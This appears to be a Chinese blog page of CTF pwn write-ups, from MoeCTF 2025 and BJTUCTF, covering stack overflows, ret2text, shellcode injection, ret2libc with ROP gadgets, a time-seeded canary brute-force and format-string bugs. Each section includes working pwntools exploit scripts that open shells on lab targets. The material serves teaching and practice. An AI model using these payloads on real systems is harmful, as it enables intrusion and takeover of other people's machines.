挑战吧！\nchecksec看一下：\n居然没开canary保护，可以用栈溢出进行ret2text。\n找到了一个后门函数：\n查看main函数：\nscanf等你输入一个数，这个数存进v4内，然后带进overflow内当参数，并且这个数还是作为限制你后面注入payload的长度的值。\n跟进overflow函数：\n我们需要让a1大于7从才能执行read函数，读取我们的payload，并且长度要够，那我们设定40吧，scanf要我们输入的时候就注入40吧。\n这个buf的地址在rbp之下的0x8的位置，也就是说缓冲区是0x8，再加上覆盖rbp本身所需的8字节大小，总共就是要0x16大小。\n这是64位程序完事后，记得栈平衡啊。\nexp（python3）：\n1 2 3 4 5 6 7 8 from pwn import * context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;, log_level=\u0026#39;debug\u0026#39;) io = remote(\u0026#39;192.168.149.1\u0026#39;,25708) ret = 0x40101a io.sendline(b\u0026#39;40\u0026#39;) payload = 16 * b\u0026#39;a\u0026#39; + p64(ret) + p64(0x4011B6) io.sendline(payload) io.interactive() 2 ezshellcode 由于直接向程序注入任意机器码（shellcode）比ROP这样的代码重用攻击灵活得多，我们时常只通过ROP构造注入shellcode的机会，然后劫持控制流执行shellcode。那么为了执行它我们需要怎么做呢？在这个题里你将得到答案。\n注意一下pwntools的context设置，因为最后你大概会通过pwntools的asm函数来汇编shellcode，此时asm会根据context中arch字段决定shellcode的架构。另外，pwntools中还给了我们一个shellcode神器——shellcraft，请去了解下怎么使用。\nchecksec看到程序是64位保护全开的。\nIDA64位分析：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 int __fastcall main(int argc, const char **argv, const char **envp) { int v4; // [rsp+0h] [rbp-20h] BYREF int prot; // [rsp+4h] [rbp-1Ch] int v6; // [rsp+8h] [rbp-18h] int v7; // [rsp+Ch] [rbp-14h] void *s; // [rsp+10h] [rbp-10h] unsigned __int64 v9; // [rsp+18h] [rbp-8h] v9 = __readfsqword(0x28u); init(argc, argv, envp); s = mmap(0LL, 0x1000uLL, 3, 34, -1, 0LL); if ( s == (void *)-1LL ) { perror(\u0026#34;mmap\u0026#34;); return 1; } memset(s, 0, 0x1000uLL); v6 = 0; prot = 0; puts(\u0026#34;In a ret2text exploit, we can use code in the .text segment.\u0026#34;); puts(\u0026#34;But now, there is no \u0026#39;system\u0026#39; function available there.\u0026#34;); puts(\u0026#34;How can you get the flag now? Perhaps you should use shellcode.\u0026#34;); puts(\u0026#34;But what is shellcode? What can you do with it? And how can you use it?\u0026#34;); puts(\u0026#34;I will give you some choices. Choose wisely!\u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v4); do v7 = getchar(); while ( v7 != 10 \u0026amp;\u0026amp; v7 != -1 ); if ( v4 == 4 ) { if ( v6 == 1 ) puts(\u0026#34;You can only make one change!\u0026#34;); prot = 7; v6 = 1; } else { if ( v4 \u0026gt; 4 ) goto LABEL_24; switch ( v4 ) { case 3: if ( v6 == 1 ) puts(\u0026#34;You can only make one change!\u0026#34;); prot = 4; v6 = 1; break; case 1: if ( v6 == 1 ) puts(\u0026#34;You can only make one change!\u0026#34;); prot = 1; v6 = 1; break; case 2: if ( v6 == 1 ) puts(\u0026#34;You can only make one change!\u0026#34;); prot = 3; v6 = 1; break; default: LABEL_24: puts(\u0026#34;Invalid choice. The space remains in its chaotic state.\u0026#34;); exit(1); } } if ( mprotect(s, 0x1000uLL, prot) == -1 ) { perror(\u0026#34;mprotect\u0026#34;); exit(1); } puts(\u0026#34;\\nYou have now changed the permissions of the shellcode area.\u0026#34;); puts(\u0026#34;If you can\u0026#39;t input your shellcode, think about the permissions you just set.\u0026#34;); read(0, s, 0x1000uLL); ((void (*)(void))s)(); return 0; } 在main函数最底下我们看到了：\n1 2 read(0, s, 0x1000uLL); ((void (*)(void))s)(); 这里的意思是读取0x1000ull长度的shellcode去执行，这里其实是一个很大的漏洞。\n其实看main函数的话，仔细点阅读理解你就发现其实这题没那么可怕O(∩_∩)O\u0026hellip;前面的几乎是废话来的（说直白点\u0026hellip;）只要scanf执行时，v4被赋值成4就完事顺利了。\n然后就写能getshell的shellcode，exp：\n1 2 3 4 5 6 7 from pwn import * context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;, log_level=\u0026#39;debug\u0026#39;) io = remote(\u0026#39;192.168.149.1\u0026#39;,34347) shellcode = asm(shellcraft.sh()) io.sendlineafter(\u0026#39;I will give you some choices. Choose wisely!\u0026#39;,str(4)) io.sendlineafter(\u0026#39;think about the permissions you just set.\u0026#39;,shellcode) io.interactive() 3 认识libc 这一次你没有了 backdoor 函数，程序也没有用到类似 system 的函数，那么你将如何 getshell 呢？此时就要从 libc 中寻找答案了。你知道达成什么样的条件才能 ret2libc 吗？我给了你一个钥匙，试着使用它吧！\n在这道题，你需要对二进制文件执行 patchelf，我在指北中已经为你描述了如何 patch，为什么要 patch。祝你玩的愉快！\nchecksec:\n64位只开了NX保护。\nIDA64分析：\n没有直接给东西你后入，只能构造后门，既然题目有提示，那就不多说开始ret2libc手法(●\u0026rsquo;◡\u0026rsquo;●)\nmain函数泄露了printf地址，可以用基地址（libc_base） = 函数当前地址 - libc库的该函数的偏移量\n这里我尝试了几次，发现printf地址都是随机（地址随机化布局保护）且都是14位数字，那我们在编写payload可以注意一下长度不要接收多余字符噢。\n然后借此得出libc_base基地址，就可以反推出system函数在此程序的真实地址了，构造出后门函数。\n泄露地址：\n1 2 3 4 5 libc = ELF(\u0026#34;./libc.so.6\u0026#34;) io.recvuntil(b\u0026#39;A gift of forbidden knowledge, the location of \\\u0026#39;printf\\\u0026#39;: \u0026#39;) printf = int(io.recv(14),16) libc_base = printf - libc.sym[\u0026#39;printf\u0026#39;] system = libc_base + libc.sym[\u0026#39;system\u0026#39;] 因为这是64位程序，参数传递是靠寄存器的，还得进行ROP攻击链构造，给system传参需要rdi\nROPgadget查询：（0x000000000002a3e5 : pop rdi ; ret）\n1 ROPgadget --binary libc.so.6 --only \u0026#34;pop|ret\u0026#34; | grep rdi 这里用libc去查pop rdi ; ret的原因是在那个程序查不到这个单独含rdi的gadget：\n这个就比较杂了，我直接用libc的gadget偏移量去反推出在这个程序里面的gadget的地址就好了，调用也方便。\nexp（python3）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 from pwn import * context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;, log_level=\u0026#39;debug\u0026#39;) io = remote(\u0026#39;192.168.149.1\u0026#39;,44080) libc = ELF(\u0026#39;./libc.so.6\u0026#39;) io.recvuntil(\u0026#39;A gift of forbidden knowledge, the location of \\\u0026#39;printf\\\u0026#39;: \u0026#39;) printf = int(io.recv(14),16) libc_base = printf - libc.sym[\u0026#39;printf\u0026#39;] system = libc_base + libc.sym[\u0026#39;system\u0026#39;] pop_rdi_ret = 0x000000000002a3e5 + libc_base ret = 0x000000000040101a binsh = next(libc.search(\u0026#39;/bin/sh\\x00\u0026#39;)) + libc_base payload = cyclic(0x40 + 8) + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system) io.sendlineafter(\u0026#39;\u0026gt; \u0026#39;,payload) io.interactive() boom 本题原分值 200 pts（另见 boom_revenge）\n你可以轻易爆破我们的系统，但是一个不可泄露的“canary”你又该如何应对？\n你可能需要使用 Python ctypes 包来直接调用 C 库函数。\n本题解法与时间有关，如果你出现本地能通远程不通的情况，请多试几次。\nchecksec:\nIDA分析：\nwin函数：\nmain函数：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 int __fastcall main(int argc, const char **argv, const char **envp) { char s[124]; // [rsp+0h] [rbp-90h] BYREF int v5; // [rsp+7Ch] [rbp-14h] int v6; // [rsp+8Ch] [rbp-4h] init(argc, argv, envp); puts(\u0026#34;Welcome to Secret Message Book!\u0026#34;); puts(\u0026#34;Do you want to brute-force this system? (y/n)\u0026#34;); fgets(\u0026amp;brute_choice, 8, stdin); v6 = 0; if ( brute_choice == 121 || brute_choice == 89 ) { v6 = 1; canary = (int)random() % 114514; v5 = canary; puts(\u0026#34;waiting...\u0026#34;); sleep(1u); puts(\u0026#34;boom!\u0026#34;); puts(\u0026#34;Brute-force mode enabled! Security on.\u0026#34;); } else { puts(\u0026#34;Normal mode. No overflow allowed.\u0026#34;); } printf(\u0026#34;Enter your message: \u0026#34;); if ( v6 ) gets(s); else fgets(s, 128, stdin); if ( v6 \u0026amp;\u0026amp; v5 != canary ) { puts(\u0026#34;Security check failed!\u0026#34;); exit(1); } puts(\u0026#34;Message received.\u0026#34;); return 0; } 这里有个静态的canary，要绕过这段代码中的静态 Canary 检查，需利用 栈溢出漏洞 + Canary 泄漏与重写 的思路。\n代码中存在两个关键分支：\n当用户选择 brute-force 模式（输入 y 或 Y）时，程序会生成一个随机 Canary（canary = random() % 114514），并通过 gets(s) 读取输入（gets 存在栈溢出漏洞，可读取任意长度输入）；\n最后通过v5 != canary检查 Canary 是否被篡改，若不一致则程序退出。\n好，接下来来了解一下canary是怎么运作的，进行检查栈溢出的原理是什么。\nCanary 位于缓冲区和返回地址之间：以题目中的栈布局为例，Canary 位于 s 缓冲区末尾之后、返回地址之前，形成 “缓冲区 → Canary → 返回地址” 的防护链。这样设计的目的是：若攻击者试图通过缓冲区溢出覆盖返回地址，必须先覆盖 Canary，从而触发校验。\n要注意的是，canary是int 32位的噢：\n也就是说需要满足canary校验就可以，多次上传payload，爆破canary的值，只要有一次校验通过就能getshell。\n大致exp框架：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from ctypes import CDLL, cdll import time from pwn import * context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;, log_level=\u0026#39;debug\u0026#39;) io = remote(\u0026#39;192.168.149.1\u0026#39;,) getshell = 0x401276 ret = 0x000000000040101a ... io.recvuntil(b\u0026#39;Do you want to brute-force this system? (y/n)\u0026#39;) io.sendline(b\u0026#39;y\u0026#39;) io.recvuntil(b\u0026#39;Enter your message: \u0026#39;) payload = (cyclic(124) + p32(canary)).ljust(0x90,b\u0026#39;\\x00\u0026#39;) + p64(ret) + p64(getshell) io.interactive() 其实到这里我也不会了，需要借助AI了，对话1：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 可能需要使用 Python ctypes 包来直接调用 C 库函数。 main函数C伪代码： int __fastcall main(int argc, const char **argv, const char **envp) { char s[124]; // [rsp+0h] [rbp-90h] BYREF int v5; // [rsp+7Ch] [rbp-14h] int v6; // [rsp+8Ch] [rbp-4h] init(argc, argv, envp); puts(\u0026#34;Welcome to Secret Message Book!\u0026#34;); puts(\u0026#34;Do you want to brute-force this system? (y/n)\u0026#34;); fgets(\u0026amp;brute_choice, 8, stdin); v6 = 0; if ( brute_choice == 121 || brute_choice == 89 ) { v6 = 1; canary = (int)random() % 114514; v5 = canary; puts(\u0026#34;waiting...\u0026#34;); sleep(1u); puts(\u0026#34;boom!\u0026#34;); puts(\u0026#34;Brute-force mode enabled! Security on.\u0026#34;); } else { puts(\u0026#34;Normal mode. No overflow allowed.\u0026#34;); } printf(\u0026#34;Enter your message: \u0026#34;); if ( v6 ) gets(s); else fgets(s, 128, stdin); if ( v6 \u0026amp;\u0026amp; v5 != canary ) { puts(\u0026#34;Security check failed!\u0026#34;); exit(1); } puts(\u0026#34;Message received.\u0026#34;); return 0; } 怎么爆破canary,绕过检查，这是我的大致exp框架： 对话2：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 exp: from ctypes import CDLL, cdll import time from pwn import * context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;, log_level=\u0026#39;debug\u0026#39;) io = remote(\u0026#39;192.168.149.1\u0026#39;,) getshell = 0x401276 ret = 0x000000000040101a ... io.recvuntil(b\u0026#39;Do you want to brute-force this system? (y/n)\u0026#39;) io.sendline(b\u0026#39;y\u0026#39;) io.recvuntil(b\u0026#39;Enter your message: \u0026#39;) payload = (cyclic(124) + p32(canary)).ljust(0x90,b\u0026#39;\\x00\u0026#39;) + p64(ret) + p64(getshell) io.interactive() 现在就差爆破canary,我的思路是有一个循环语句让payload一直循环连接io然后不停尝试栈溢出到canary值,canary值一直尝试,直到能绕过检查getshell,以下是IDA中的C伪代码: int __fastcall main(int argc, const char **argv, const char **envp) { char s[124]; // [rsp+0h] [rbp-90h] BYREF int v5; // [rsp+7Ch] [rbp-14h] int v6; // [rsp+8Ch] [rbp-4h] init(argc, argv, envp); puts(\u0026#34;Welcome to Secret Message Book!\u0026#34;); puts(\u0026#34;Do you want to brute-force this system? (y/n)\u0026#34;); fgets(\u0026amp;brute_choice, 8, stdin); v6 = 0; if ( brute_choice == 121 || brute_choice == 89 ) { v6 = 1; canary = (int)random() % 114514; v5 = canary; puts(\u0026#34;waiting...\u0026#34;); sleep(1u); puts(\u0026#34;boom!\u0026#34;); puts(\u0026#34;Brute-force mode enabled! Security on.\u0026#34;); } else { puts(\u0026#34;Normal mode. No overflow allowed.\u0026#34;); } printf(\u0026#34;Enter your message: \u0026#34;); if ( v6 ) gets(s); else fgets(s, 128, stdin); if ( v6 \u0026amp;\u0026amp; v5 != canary ) { puts(\u0026#34;Security check failed!\u0026#34;); exit(1); } puts(\u0026#34;Message received.\u0026#34;); return 0; } 代码块不加注释,只用在外面加以解释 逻辑解释(AI解答)：\n种子范围确定：程序中 Canary 由random() % 114514生成，而random()的序列由seed决定。通过当前时间now及附近值（前后 5 秒）作为种子，覆盖程序启动时可能使用的种子范围。 循环尝试：对每个种子生成对应的 Canary 值，重新建立连接并发送包含该 Canary 的 payload。 payload 构造：按缓冲区(124字节) + Canary(32位) + 填充至0x90长度 + ret指令(栈对齐) + getshell地址的结构构造，确保绕过 Canary 检查后跳转到目标函数。 结果判断：若发送后成功进入交互模式，说明 Canary 正确并 getshell；否则关闭连接继续尝试下一个可能值。 稍微修改一下就好。\nexp:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from ctypes import CDLL import time from pwn import * context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;, log_level=\u0026#39;debug\u0026#39;) libc = CDLL(\u0026#39;libc.so.6\u0026#39;) getshell = 0x40127b now = int(time.time()) io = remote(\u0026#39;192.168.149.1\u0026#39;, 4131) io.recvuntil(b\u0026#34;Do you want to brute-force this system? (y/n)\\n\u0026#34;) io.sendline(b\u0026#39;y\u0026#39;) io.recvuntil(b\u0026#39;Enter your message: \u0026#39;) for seed in [now, now-1, now+1]: libc.srandom(seed) canary = libc.random() % 114514 payload = (cyclic(124) + p32(canary)).ljust(0x90,b\u0026#39;\\x00\u0026#39;) + p64(0) + p64(getshell) io.sendline(payload) try: io.interactive() except: print(WARN_TEXT(f\u0026#34;[-] Canary {canary} failed,next one\u0026#34;)) 这题给到我的压力很大，一度让我陷入自我怀疑\u0026hellip;我在想XDCTF新生赛都这么难，感觉都涉及算法“超纲”了，在我看来这也是体现我们学习能力的一方面，及时利用AI补全，学会如何用AI补全脚本、解析代码也是一种CTFer的必不可少的一种技巧！\nfmt 格式化字符串是一种在编程中用于控制输出格式的技术。在C语言中，格式化字符串通常与 printf、scanf、sprintf 等函数一起使用。\n如果我们能控制格式化字符串，含有各种格式说明符（形如%s,%p），并且不提供后续参数，程序会从哪里找来一个“虚空”参数？这可能导致意想不到的结果！\n","date":"2025-11-03T00:00:00Z","headings":[{"id":"安全杂项","level":2,"text":"安全杂项\n"},{"id":"密码学","level":2,"text":"密码学\n"},{"id":"二进制漏洞审计","level":2,"text":"二进制漏洞审计\n"},{"id":"2048_master","level":3,"text":"2048_master\n"},{"id":"misc入门指北","level":3,"text":"Misc入门指北\n"},{"id":"pyjail-0","level":3,"text":"Pyjail 0\n"},{"id":"rush","level":3,"text":"Rush\n"},{"id":"ez_lsb","level":3,"text":"ez_LSB\n"},{"id":"ez_锟斤拷","level":3,"text":"ez_锟斤拷????\n"},{"id":"weird_photo","level":3,"text":"weird_photo\n"},{"id":"sstv","level":3,"text":"SSTV\n"},{"id":"encrypted_pdf","level":3,"text":"encrypted_pdf\n"},{"id":"哈基米难没露躲","level":3,"text":"哈基米难没露躲\n"},{"id":"捂住一只耳","level":3,"text":"捂住一只耳\n"},{"id":"enchantment","level":3,"text":"Enchantment\n"},{"id":"webrepo","level":3,"text":"WebRepo\n"},{"id":"ez_ssl","level":3,"text":"ez_ssl\n"},{"id":"万里挑一","level":3,"text":"万里挑一\n"},{"id":"ez_png","level":3,"text":"ez_png\n"},{"id":"二进制漏洞审计入门指北","level":3,"text":"二进制漏洞审计入门指北\n"},{"id":"1-ez_u64","level":3,"text":"1 ez_u64\n"},{"id":"1-find-it","level":3,"text":"1 find it\n"},{"id":"2-eztext","level":3,"text":"2 EZtext\n"},{"id":"2-ezshellcode","level":3,"text":"2 ezshellcode\n"},{"id":"3-认识libc","level":3,"text":"3 认识libc\n"},{"id":"boom","level":3,"text":"boom\n"},{"id":"fmt","level":3,"text":"fmt\n"}],"image":"https://expl0rer.top/p/moectf_2025/moectf2025_hu_dc77fe339b81ad45.webp","permalink":"https://expl0rer.top/p/moectf_2025/","title":"Moectf_2025"},{"content":"[TOC]\n前沿概述 BJTUCTF-PWN：\n出题主要考察入门PWN~栈溢出进阶的内容，涉及栈溢出基本原理、libc泄露、ROP构造攻击链、沙盒逃逸等。\n出题环境：Ubuntu18.04、Ubuntu24.04、备用Kali2024\n程序源代码类型：C语言\n已公布WP。\nBJTUCTF——WP 1 2 3 4 5 6 7 8 ____ _ _______ _ _ _____ _______ ______ | _ \\ | |__ __| | | |/ ____|__ __| ____| | |_) | | | | | | | | | | | | | |__ | _ \u0026lt; _ | | | | | | | | | | | | __| | |_) | |__| | | | | |__| | |____ | | | | |____/ \\____/ |_| \\____/ \\_____| |_| |_| ———北京交通大学 前言：请各位不要完全照抄WP的exp，都是作者在本地复现，要远程连接靶机复现就稍改一下，加个远程端口和IP就好😄。\npwn1 pwn1\n这题是让大家测试自己的环境是否部署成功，包括Linux虚拟机、nc、pwntools、python2和3等。\n直接运行exp：\n1 2 3 4 5 6 7 8 from pwn import * context(arch = \u0026#39;i386\u0026#39;,log_level = \u0026#39;debug\u0026#39;, os = \u0026#39;linux\u0026#39;) io = process(\u0026#39;./pwn1\u0026#39;) #io = remote(\u0026#34;ip\u0026#34;, port) shellcode = asm(shellcraft.sh()) io.sendline(shellcode) #io.recv() io.interactive() 这题用意在于你是否能理解每一行代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 # 导入pwntools库，这是CTF中pwn题常用的工具库，提供了各种漏洞利用相关的功能 from pwn import * # 设置程序运行的上下文环境 # arch=\u0026#39;i386\u0026#39;：指定目标程序是32位架构（x86）;当然还有64位架构的，那么此时的arch = \u0026#39;amd64\u0026#39; # log_level=\u0026#39;debug\u0026#39;：设置日志级别为debug，会显示详细的交互信息，方便调试 # os=\u0026#39;linux\u0026#39;：指定目标操作系统是Linux context(arch = \u0026#39;i386\u0026#39;, log_level = \u0026#39;debug\u0026#39;, os = \u0026#39;linux\u0026#39;) # 创建一个进程对象，启动本地的pwn1程序（当前目录下的可执行文件pwn1） # 相当于在终端中运行./pwn1 io = process(\u0026#39;./pwn1\u0026#39;) # 如果是远程连接题目服务器，就注释掉上面的process，使用下面这行 # io = remote(\u0026#34;ip\u0026#34;, port) # \u0026#34;ip\u0026#34;是服务器地址，port是端口号，比如remote(\u0026#34;127.0.0.1\u0026#34;, 10086) # 生成一个获取shell的shellcode（机器码） # shellcraft.sh()：pwntools内置的生成\u0026#34;获取sh交互shell\u0026#34;的汇编代码 # asm()：将汇编代码转换为机器码（可直接在CPU上执行的二进制指令） shellcode = asm(shellcraft.sh()) # 向程序发送生成的shellcode # sendline()：发送数据后自动添加换行符，相当于在终端输入内容后按回车 io.sendline(shellcode) # （可选）接收程序返回的内容 # io.recv() # 进入交互模式，此时可以像操作终端一样输入命令（比如ls、cat flag等） # 当程序成功执行shellcode后，会获得一个shell，通过这里进行交互 io.interactive() PWN的解题思路大致为：checksec指令看保护信息→使用正确的IDA去分析功能函数→看汇编代码和C语言伪代码→寻找漏洞包括后门函数system(\u0026quot;/bin/sh\u0026quot;);、execve(\u0026quot;/bin/sh\u0026quot;);、system(\u0026quot;sh\u0026quot;);等→编写EXP\n在此之前需要特别注意的是程序架构，有x86和x64，两个架构的参数传递顺序、字节长度、运行流程都有所差别。\npwn2 pwn2\nchecksec一下看看：\nArch：程序架构为 i386 - 32 - little，即 32 位小端序的 Intel x86 架构。 RELRO：开启了 Partial RELRO，意味着部分重定位只读，有一定的防重定向攻击能力，但不是完全的。 Stack：No canary found，表示栈中没有启用栈保护（金丝雀），这使得栈溢出攻击更容易实施。 NX：NX enabled，表示启用了不可执行（No - eXecute）保护，即栈上的代码默认不可执行，能防范一些基于栈的代码注入攻击。 PIE：No PIE，即没有启用地址空间布局随机化（Position - Independent Executable），程序的内存地址是固定的，这对利用内存漏洞（如缓冲区溢出等）有帮助，因为攻击者可以预先知道关键地址。 IDA32位分析：\n双击跟进BJTUCTF函数：\n现在开始读C语言代码了，看看在讲什么，定义了容量为18大小的buf数组，然后有一个read函数，会读取0x32大小到buf上。乍一看很正常，其实这已经是一个漏洞了，我们可以用借助read的作用，使程序发生栈溢出，填满了buf接着溢出后，把return对应的地址给覆盖了，这时候return会指向我们覆盖的代码，那我们可以设计把这个覆盖的代码写成设计好的一个地址，这样return返回到那个地址，去执行我想要的效果。\n行，本题基本思路已达成，那我们找找有无可利用的东西，在左边的函数目录上看到了两个函数很可疑：hint \u0026amp; SASCTF\n看到这里就想，根本不是system(\u0026quot;/bin/sh\u0026quot;);，比较相似有个sh啊，其实在开篇题目运行程序时，就已经提示过了，这题就是要用sh去拿后台程序的flag，没用常见的后门函数，那我们就自己构建一个\u0026hellip;。\n先把exp框架搭出来：\n1 2 3 4 5 6 7 8 9 10 from pwn import * context( arch = \u0026#39;i386\u0026#39;, os = \u0026#39;linux\u0026#39;, log_level = \u0026#39;debug\u0026#39;) #io = remote(\u0026#39;ip\u0026#39;,port) io = process(\u0026#39;./pwn2\u0026#39;) ... io.sendline(payload) io.recv() io.interactive() 差payload：\n一开始先把缓冲区（buf）填满先，用0x16，待会还要加4，也就是（0x16+4），为什么加4？\n在 32 位程序的函数调用栈帧中，结构大致如下（从高地址到低地址）：\n1 2 3 [返回地址] ← 函数执行结束后要跳转的地址（4字节） [ebp] ← 上一层栈帧的基址指针（4字节） [局部变量] ← 包括我们要溢出的缓冲区（大小为0x16字节） 当进行缓冲区溢出时：\n首先需要填充 0x16 字节来填满整个缓冲区（局部变量区域） 接着需要再填充 4 字节来覆盖 ebp（因为 32 位系统中 ebp 是 4 字节寄存器） 覆盖 ebp 本身对漏洞利用通常没有直接作用，但这是到达返回地址的必经之路 —— 只有先覆盖掉 ebp，后续的数据才能写入到返回地址的位置。\n所以 0x16+4 的完整含义是：0x16 字节填满缓冲区 + 4 字节覆盖 ebp，之后就可以开始写入我们想要的返回地址（system 函数地址）了。\nsystem函数：\n1 2 3 4 5 // attributes: thunk int system(const char *command) { return system(command); } 可知道system函数只有一个变量参数要代入。我们没找到/bin/sh，构造不出system(\u0026quot;/bin/sh\u0026quot;);，但我们可以构造出system(\u0026quot;sh\u0026quot;);\n用Alt+T搜寻sh字符串地址：\npayload：\n1 2 3 4 elf = ELF(\u0026#39;./pwn2\u0026#39;) system = elf.sym[\u0026#39;system\u0026#39;] sh = 0x804A23D payload =cyclic(0x16+4) + p32(system) + p32(0) + p32(sh) 其实这里的system函数地址可以用IDA去找的，我这里用ELF去找也行，更方便。\nexp：\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * context( arch = \u0026#39;i386\u0026#39;, os = \u0026#39;linux\u0026#39;, log_level = \u0026#39;debug\u0026#39;) #io = remote(\u0026#39;ip\u0026#39;,port) io = process(\u0026#39;./pwn2\u0026#39;) elf = ELF(\u0026#39;./pwn2\u0026#39;) system = elf.sym[\u0026#39;system\u0026#39;] sh = 0x804A23D payload =cyclic(0x16+4) + p32(system) + p32(0) + p32(sh) io.sendline(payload) io.recv() io.interactive() pwn3 pwn3\n这题来到一个ROPgadget的使用，给各位简单介绍一下：\nROPgadget 是一款在二进制漏洞利用领域广泛使用的工具，主要用于寻找和分析二进制文件中的返回导向编程（Return - Oriented Programming，ROP）小工具（gadget）。\nROPgadget在漏洞利用中的作用 绕过防御机制：在现代操作系统中，存在多种内存保护机制，如栈保护（Canary）、地址空间布局随机化（ASLR）、不可执行栈（NX）等。ROP 技术利用程序中已有的代码片段（ROPgadget）来构建新的执行逻辑，能够在不执行攻击者注入的代码（绕过 NX 保护）的情况下，实现任意代码执行的效果。例如，攻击者可以利用 ROPgadget 来构建系统调用，以获取 shell。 构造复杂攻击链：通过组合不同功能的 ROPgadget，攻击者可以实现一系列复杂的操作，如设置函数参数、调用特定函数等，从而完成对目标程序的攻击。 工作原理 机器码扫描：ROPgadget 会对二进制文件（如 ELF、PE 等格式）进行扫描，它不是基于高级语言的语法来分析，而是直接针对机器码。通过搜索特定的指令序列模式，找到以 ret 指令结尾的指令片段，这些片段就是 ROPgadget。 地址解析：在找到 ROP 小工具后，还会解析出它们在二进制文件中的虚拟地址，方便在漏洞利用代码编写时使用。 主要功能 查找 ROPgadget：用户可以指定二进制文件，ROPgadget 会列出文件中所有符合条件的 ROP 小工具。例如，它可以找到能够用于设置寄存器值、执行系统调用等功能的小工具。 过滤与筛选：支持根据不同的条件对 ROP 小工具进行过滤，比如按照指令的具体内容（如寻找包含特定寄存器操作的 gadget）、操作数的值等进行筛选，帮助使用者更精准地找到需要的小工具。 详见请进入我的文章中学习ROP前传、ROP++\n题解过程 checksec：\nIDA64位分析：\n找到了一个backdoor函数，那我们就可以通过栈溢出（0xA+8，64位架构的寄存器ebp是8字节大小）覆盖返回地址，使指针指向backdoor的system函数从而得到交互权限拿flag。\n先写出大致exp框架：\n1 2 3 4 5 6 7 8 9 10 11 12 from pwn import * context(arch = \u0026#39;amd64\u0026#39;, os = \u0026#39;linux\u0026#39;, log_level = \u0026#39;debug\u0026#39;) #io = remote(\u0026#39;ip\u0026#39;, port) io = process(\u0026#39;./pwn3\u0026#39;) elf = ELF(\u0026#39;./pwn3\u0026#39;) backdoor = elf.sym[\u0026#39;backdoor\u0026#39;] ... io.sendline(payload) io.recv() io.interactive() 那payload就应该是：\n1 payload = cyclic(0xA+8) + p64(backdoor) 看到这里你可以去尝试一下是否能打通，发现是报EOF崩溃的(如SIGSEGV)。\n这里涉及到一个细节：\n64 位程序调用 system 需考虑堆栈平衡，本质是 64 位 ABI 对 “栈对齐” 的硬性要求 —— 若不满足，函数执行时访问栈内存会崩溃；而 32 位 ABI 无此要求，仅需调用后清理参数栈即可，因此无需额外关注平衡。\n对于这个阶段的PWN学习，要进一步判断是否堆栈平衡，需要用到gdb调试，16字节求余等方法去判断，比较难理解，等各位后续学到调用约定、程序架构、栈堆就可慢慢理解，对于当前阶段而言只需记得堆栈不平衡就加上ret的地址进行调平即可。\nret就相当于return，执行之后就会返回“起点”，相当于一次校正，怕你走歪，不然你后续执行程序就会引发崩溃。\n所以说 exp的payload 需要考虑到堆栈平衡加上 ret 指令片段的返回地址：\n这里我们用：\n1 ROPgadget --binary ./pwn3 | grep ret 所以：\n1 2 ret = 0x000000000040101a payload = cyclic(0xA+8) + p64(ret) + p64(backdoor) 根据崩溃情况反推：如果去掉ret后程序崩溃（如报SIGSEGV），但加上ret后正常执行，那就说明需要堆栈平衡，这就是64架构的不同之处。\n完整版exp：\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * context(arch = \u0026#39;amd64\u0026#39;, os = \u0026#39;linux\u0026#39;, log_level = \u0026#39;debug\u0026#39;) #io = remote(\u0026#39;ip\u0026#39;, port) io = process(\u0026#39;./pwn3\u0026#39;) elf = ELF(\u0026#39;./pwn3\u0026#39;) backdoor = elf.sym[\u0026#39;backdoor\u0026#39;] ret = 0x000000000040101a payload = cyclic(0xA+8) + p64(ret) + p64(backdoor) io.sendline(payload) io.recv() io.interactive() pwn4 pwn4\n这题初步考察了格式化字符串。\nchecksec一下：\n32位关闭PIE，部分开启RELRO，开启了canary保护，意味着不能用栈溢出那一套方法了。😄\nIDA\n32位分析：\n从main函数可以看到当Expl0rer = 6 的时候即可获的一个shell。\n双击BJTUCTF函数跟进查看：\n可以看到这里的ptintf(s)明显的存在格式化字符串漏洞，第一次接触，不知道为啥这里就存在漏洞？别急后面会逐步讲解。\n首先将数组s初始化为0，清除数组中的内容，然后读取0x50的数据到字符数组s中。\nprintf(s); 使用用户输入的内容作为格式字符串，进行 printf 输出。这里存在格式字符串漏洞，我们可以先简单尝试一下，先正常输入字符，看起来没有问题：\n但是当我们输入特殊的格式字符时候会输出特定的内容：\n运行了多次，发现下面这串地址是随机化的。\n在 C 语言中，%x 是 printf 等格式化输出函数的格式控制符，用于将整数以十六进制（小写字母） 的形式输出。\n输入 %x.%x.%x，可能会输出类似 bffff3a0.8048520.1 的结果，这些就是栈上不同位置的数据（具体值取决于程序运行时的栈状态）。\n这种特性使得 %x 